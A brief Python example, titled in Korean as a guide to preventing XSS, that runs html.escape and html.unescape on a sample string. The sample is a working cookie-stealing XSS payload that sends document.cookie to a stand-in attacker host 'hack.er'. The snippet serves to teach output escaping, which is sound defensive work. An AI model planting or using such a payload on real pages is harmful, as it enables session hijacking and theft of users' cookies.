#	XSS 공격을 막으려면? ― html
import html

src = '<script>location.href="http://hack.er/Cookie.php?cookie="+document.cookie</script>'
result = html.escape(src)
print(result)
result2 = html.unescape(result)
print(result2)